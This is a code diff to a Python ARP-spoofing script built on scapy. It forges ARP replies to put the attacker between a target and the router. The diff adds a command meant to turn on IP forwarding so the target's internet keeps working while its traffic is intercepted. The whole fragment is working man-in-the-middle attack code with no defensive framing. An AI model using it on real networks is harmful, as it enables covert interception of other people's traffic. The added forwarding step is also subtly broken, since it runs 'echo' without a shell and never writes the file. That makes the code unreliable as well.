@@ -2,6 +2,7 @@
 #If middle pc is the router/spoofip response back to target
 import scapy.all as s
 import time
+import subprocess
 
 def get_mac(ip):
     arp_request = s.ARP(pdst=ip)
@@ -17,8 +18,10 @@ def spoof(targetip,spoofip):
     packet = s.ARP(op=2,pdst=targetip, hwdst=targetmac, psrc=spoofip )
     s.send(packet)
 
-
-
+#Port forwarding so target can still use internet
+bashCommand = "echo 1 > /proc/sys/net/ipv4/ip_forward"
+process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
+output, error = process.communicate()
 
 targetip=""
 spoofip=""
